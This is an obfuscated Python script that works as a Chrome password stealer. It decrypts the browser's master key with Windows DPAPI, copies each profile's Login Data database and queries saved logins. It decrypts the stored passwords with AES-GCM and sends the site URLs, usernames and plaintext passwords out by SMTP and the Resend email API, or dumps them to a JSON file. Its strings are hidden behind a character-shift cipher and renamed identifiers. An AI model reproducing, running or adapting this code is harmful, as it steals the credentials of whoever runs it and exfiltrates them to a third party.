# Obfuscated with PyObfx #
from pathlib import Path as UleVkrmD
import yaml as fedBRTAx
from typing import Dict as McnbGPKa
from typing import  Union as KboryNzgXs
import os as OQva
import sys as lKRioZ
import smtplib as lZjLCUePnKzicq
from email.mime.text import MIMEText as EZPgouzXOmxFkYsU
import re as drYv
import json as zjmkUZdG
import base64 as wvfIoyVZsXeN
import sqlite3 as CVsKuBEDfhGkJp
import win32crypt as FEhDdGljRtyzpTYbmSIg
from Cryptodome.Cipher import AES as qCSrBI
import shutil as arHmskFwBueK
import resend as cdyHaeQzKbkr

TyaYEpsBtw = lambda n: n - sum([2, 5, 4])
CliPgUnjbM = lambda s: ''.join(chr(int(TyaYEpsBtw(ord(c)))) for c in s)
VXqihUDKdIZRGJbYxO = OQva.path.dirname(OQva.path.realpath(lKRioZ.argv[int(TyaYEpsBtw(11))]))
# 方便混淆
cgXUxVrnZIBFEOWGwiRomCkvKasYSLDupljJ = OQva.environ[CliPgUnjbM("`^P][]ZQTWP")]
SwycHgndDFahrLiAZkQGNWpXObTljmPuzKqv = CliPgUnjbM("ggL{{OllggWznlwggRzzrwpggNs}zxpgg`~p}+Oll")


def mnXHhTsiNDIFpcKBWx(tzgVywJhjNHdrSmIki: KboryNzgXs[str, UleVkrmD]) -> McnbGPKa:
    wkQtUdcDboSxgWva = getattr(lKRioZ, CliPgUnjbM("jXPT[L^^"), OQva.path.dirname(OQva.path.abspath(__file__)))
    nYJDleyKujPcFwkbpXtmOV = OQva.path.join(wkQtUdcDboSxgWva, tzgVywJhjNHdrSmIki)
    with open(nYJDleyKujPcFwkbpXtmOV, CliPgUnjbM("}m")) as Ne:
        WOguKNcl = fedBRTAx.load(Ne, Loader=fedBRTAx.Loader)
    if CliPgUnjbM("tynwop") in WOguKNcl:
        IOtDEncFaWHhZQ = WOguKNcl.pop(CliPgUnjbM("tynwop"))
        if isinstance(IOtDEncFaWHhZQ, str):
            IOtDEncFaWHhZQ = [IOtDEncFaWHhZQ]
        for hQ in IOtDEncFaWHhZQ:
            WOguKNcl.update(mnXHhTsiNDIFpcKBWx(UleVkrmD(nYJDleyKujPcFwkbpXtmOV).parent / hQ))
    return WOguKNcl


QGXKZSTROPul = mnXHhTsiNDIFpcKBWx(CliPgUnjbM("nzyqtr9lxw"))


def VglUGqfAcHLeEh(WOguKNcl):
    oVHcfBQw = CliPgUnjbM("GlmwpI")
    oVHcfBQw += CliPgUnjbM("G}IGsI`]WG:sIGsI`~p}ylxpG:sIGsI[l~~z}oG:sIG:}I")

    for OxYWKVwn in WOguKNcl:
        oVHcfBQw += CliPgUnjbM("G}I")
        oVHcfBQw += "<td>{}</td>".format(OxYWKVwn[CliPgUnjbM("}w")])
        oVHcfBQw += "<td>{}</td>".format(OxYWKVwn[CliPgUnjbM("~p}ylxp")])
        oVHcfBQw += "<td>{}</td>".format(OxYWKVwn[CliPgUnjbM("{")])
        oVHcfBQw += CliPgUnjbM("G:}I")

    oVHcfBQw += CliPgUnjbM("G:lmwpI")
    return oVHcfBQw

def ikWFsgfrHeXxdnJtElRq(jfFiGvANdz,bhznfy):
    if QGXKZSTROPul[CliPgUnjbM("pxltw")][CliPgUnjbM("sz~")] == "" or QGXKZSTROPul[CliPgUnjbM("pxltw")][CliPgUnjbM("~p}")] == "" or QGXKZSTROPul[CliPgUnjbM("pxltw")][CliPgUnjbM("{l~~")] == "" or QGXKZSTROPul[CliPgUnjbM("pxltw")][CliPgUnjbM("~pyop}")] == "" or QGXKZSTROPul[CliPgUnjbM("pxltw")][CliPgUnjbM("}pnptp}~")] == "":
        return
    eyZEhQmbRCckrT = EZPgouzXOmxFkYsU(bhznfy,CliPgUnjbM("{wlty"),CliPgUnjbM("q8C"))
    eyZEhQmbRCckrT[CliPgUnjbM("^mupn")] = jfFiGvANdz 
    eyZEhQmbRCckrT[CliPgUnjbM("Q}zx")] = QGXKZSTROPul[CliPgUnjbM("pxltw")][CliPgUnjbM("~pyop}")]   
    eyZEhQmbRCckrT[CliPgUnjbM("_z")] = QGXKZSTROPul[CliPgUnjbM("pxltw")][CliPgUnjbM("}pnptp}~")] 
    try:
        mUwCHqozTFsXib = lZjLCUePnKzicq.SMTP() 
        mUwCHqozTFsXib.connect(QGXKZSTROPul[CliPgUnjbM("pxltw")][CliPgUnjbM("sz~")],int(TyaYEpsBtw(36)))
        mUwCHqozTFsXib.login(QGXKZSTROPul[CliPgUnjbM("pxltw")][CliPgUnjbM("~p}")],QGXKZSTROPul[CliPgUnjbM("pxltw")][CliPgUnjbM("{l~~")]) 
        mUwCHqozTFsXib.sendmail(QGXKZSTROPul[CliPgUnjbM("pxltw")][CliPgUnjbM("~pyop}")],[QGXKZSTROPul[CliPgUnjbM("pxltw")][CliPgUnjbM("}pnptp}~")]],eyZEhQmbRCckrT.as_string()) 
        mUwCHqozTFsXib.quit() 
    except Exception as bg:
        print(bg)

def gztMhSBWEGYadXZNTOijAcnI(bhznfy):
    if QGXKZSTROPul[CliPgUnjbM("}p~pyo")][CliPgUnjbM("vp")] == "":
        return
    bhznfy = VglUGqfAcHLeEh(bhznfy)
    cdyHaeQzKbkr.api_key = QGXKZSTROPul[CliPgUnjbM("}p~pyo")][CliPgUnjbM("vp")] 
    try:
        nu = cdyHaeQzKbkr.Emails.send({
            CliPgUnjbM("q}zx"): QGXKZSTROPul[CliPgUnjbM("}p~pyo")][CliPgUnjbM("q}zx")],
            CliPgUnjbM("z"): QGXKZSTROPul[CliPgUnjbM("}p~pyo")][CliPgUnjbM("z")],
            CliPgUnjbM("~mupn"): CliPgUnjbM("Tyqz^pn8RzzrwpNs}zxp"),
            CliPgUnjbM("sxw"): bhznfy 
        })
    except Exception as bg:
        print(bg)

def rQiKZqCcuIvtfbdAUzLGawPEHeRmSYWopMXk():
    try:
        ZKYJBkcVhpwnzNdvDxLOorbiqUtfCsWX = cgXUxVrnZIBFEOWGwiRomCkvKasYSLDupljJ + SwycHgndDFahrLiAZkQGNWpXObTljmPuzKqv
        FYZdyfglvHsPuJoaEXVrWRnOICxmLG = OQva.path.normpath(OQva.path.join(ZKYJBkcVhpwnzNdvDxLOorbiqUtfCsWX, CliPgUnjbM("Wznlw+^lp")))
        uyJrRFqVDAeTNlSzkt = OQva.path.join(VXqihUDKdIZRGJbYxO,CliPgUnjbM("9:px{"))
        arHmskFwBueK.copy(FYZdyfglvHsPuJoaEXVrWRnOICxmLG, uyJrRFqVDAeTNlSzkt)
        with open(uyJrRFqVDAeTNlSzkt, CliPgUnjbM("}"), encoding=CliPgUnjbM("q8C")) as Ne:
            aXbopFmVGCWBSgHdjqQyTR = Ne.read()
            aXbopFmVGCWBSgHdjqQyTR = zjmkUZdG.loads(aXbopFmVGCWBSgHdjqQyTR)
        afeDBRJvmzUbqIsoSVXx = wvfIoyVZsXeN.b64decode(aXbopFmVGCWBSgHdjqQyTR[CliPgUnjbM("z~jn}{")][CliPgUnjbM("pyn}{pojvp")])
        afeDBRJvmzUbqIsoSVXx = afeDBRJvmzUbqIsoSVXx[int(TyaYEpsBtw(16)):] 
        afeDBRJvmzUbqIsoSVXx = FEhDdGljRtyzpTYbmSIg.CryptUnprotectData(afeDBRJvmzUbqIsoSVXx, None, None, None, int(TyaYEpsBtw(11)))[int(TyaYEpsBtw(12))]
        OQva.remove(uyJrRFqVDAeTNlSzkt)
        return afeDBRJvmzUbqIsoSVXx
    except Exception as bg:
        if OQva.path.exists(uyJrRFqVDAeTNlSzkt):
            OQva.remove(uyJrRFqVDAeTNlSzkt)
        return None
    

def VuIDhNiKFHGJpyzbUBPgRaltcSwdjC(rjTxymJtHRuY, ziKIyaCmdbkgrB):
    return rjTxymJtHRuY.decrypt(ziKIyaCmdbkgrB)

def dQJUiIkjtSFaLwqKEbnfmuyMgXzpcY(SkWbteDfgEuIvY, fgVp):
    return qCSrBI.new(SkWbteDfgEuIvY, qCSrBI.MODE_GCM, fgVp)

def KBYCwnrmuhpNlFsokGDfbIdyaMzxeqTP(KQDbrxnhdzqjEcsvUkwJ, afeDBRJvmzUbqIsoSVXx):
    try:
        UCxLIKbcdDltzFrZQaAniEjROMTXBkJwWNhoVesufq = KQDbrxnhdzqjEcsvUkwJ[int(TyaYEpsBtw(14)):int(TyaYEpsBtw(26))]
        ZmMwtpSbqOFicJWNxedykjQIoDVrYhXgznGB = KQDbrxnhdzqjEcsvUkwJ[int(TyaYEpsBtw(26)):-int(TyaYEpsBtw(27))]
        rjTxymJtHRuY = dQJUiIkjtSFaLwqKEbnfmuyMgXzpcY(afeDBRJvmzUbqIsoSVXx, UCxLIKbcdDltzFrZQaAniEjROMTXBkJwWNhoVesufq)
        hmUHDQrTWkNdptcynPFRYjBZESxa = VuIDhNiKFHGJpyzbUBPgRaltcSwdjC(rjTxymJtHRuY, ZmMwtpSbqOFicJWNxedykjQIoDVrYhXgznGB)
        hmUHDQrTWkNdptcynPFRYjBZESxa = hmUHDQrTWkNdptcynPFRYjBZESxa.decode()  
        return hmUHDQrTWkNdptcynPFRYjBZESxa
    except Exception as bg:
        return ""

if __name__ == CliPgUnjbM("jjxltyjj"):
    try:
        RQmGtOjAwfCIadSgDzMipUnLhuoB = rQiKZqCcuIvtfbdAUzLGawPEHeRmSYWopMXk()
        fxOneTkoZLYvNX = OQva.path.normpath(cgXUxVrnZIBFEOWGwiRomCkvKasYSLDupljJ + SwycHgndDFahrLiAZkQGNWpXObTljmPuzKqv)
        jIbyiVkeLcMCTX = [fBOmAIGuHMnDwz for fBOmAIGuHMnDwz in OQva.listdir(fxOneTkoZLYvNX) if drYv.search(CliPgUnjbM("i[}zqtwp5iOpqlw/"),fBOmAIGuHMnDwz)!=None]
        TjkuZdKPpqXznODJ = []
        for ZvVglNEMUTSd in jIbyiVkeLcMCTX:
            OmvbyXKwukALxgfQEqMHlcaRtNYS = OQva.path.normpath(OQva.path.join(fxOneTkoZLYvNX, ZvVglNEMUTSd,CliPgUnjbM("Wzrty+Oll")))
            try:
                dxPHpnreifgFtulCZNmbsqOT = OQva.path.join(VXqihUDKdIZRGJbYxO,CliPgUnjbM("9:px{9om"))
                arHmskFwBueK.copy2(OmvbyXKwukALxgfQEqMHlcaRtNYS, dxPHpnreifgFtulCZNmbsqOT) 
                PrhdYFSD = CVsKuBEDfhGkJp.connect(dxPHpnreifgFtulCZNmbsqOT)
            except Exception as bg:
                print(CliPgUnjbM("om+z{py+qltwE").format(bg))
                exit(int(TyaYEpsBtw(11)))
            if(RQmGtOjAwfCIadSgDzMipUnLhuoB and PrhdYFSD):
                USshfqOWykbl = PrhdYFSD.cursor()
                USshfqOWykbl.execute(CliPgUnjbM("^PWPN_+lntzyj}w7+~p}ylxpjlwp7+{l~~z}ojlwp+Q]ZX+wzrty~"))
                for KiaTJWFDXd,eqVNOUhJEa in enumerate(USshfqOWykbl.fetchall()):
                    FGpbrt = {}
                    FGpbrt[CliPgUnjbM("}w")] = eqVNOUhJEa[int(TyaYEpsBtw(11))]
                    FGpbrt[CliPgUnjbM("~p}ylxp")] = eqVNOUhJEa[int(TyaYEpsBtw(12))]
                    bqZaHVcgUQIR = eqVNOUhJEa[int(TyaYEpsBtw(13))]
                    if(FGpbrt[CliPgUnjbM("}w")] !="" and FGpbrt[CliPgUnjbM("~p}ylxp")]!="" and bqZaHVcgUQIR!=""):
                        Sb = KBYCwnrmuhpNlFsokGDfbIdyaMzxeqTP(bqZaHVcgUQIR, RQmGtOjAwfCIadSgDzMipUnLhuoB)
                        FGpbrt[CliPgUnjbM("{")] = Sb
                        TjkuZdKPpqXznODJ.append(FGpbrt)
                USshfqOWykbl.close()
                PrhdYFSD.close()
                OQva.remove(dxPHpnreifgFtulCZNmbsqOT)  

        if(QGXKZSTROPul[CliPgUnjbM("z{")][CliPgUnjbM("u~zy")] == CliPgUnjbM("ZY")):
            with open(OQva.path.join(VXqihUDKdIZRGJbYxO,CliPgUnjbM("z{9u~zy")),CliPgUnjbM(""),encoding=CliPgUnjbM("q8C")) as Ne:
                    zjmkUZdG.dump(TjkuZdKPpqXznODJ,Ne,ensure_ascii=bool(int(TyaYEpsBtw(12))),indent=int(TyaYEpsBtw(15)))
        if(QGXKZSTROPul[CliPgUnjbM("z{")][CliPgUnjbM("pxltw")] == CliPgUnjbM("ZY")):
           ikWFsgfrHeXxdnJtElRq(CliPgUnjbM("Tyqz^pn8RzzrwpNs}zxp"),str(TjkuZdKPpqXznODJ))
           gztMhSBWEGYadXZNTOijAcnI(TjkuZdKPpqXznODJ) 
    except:
        pass
    
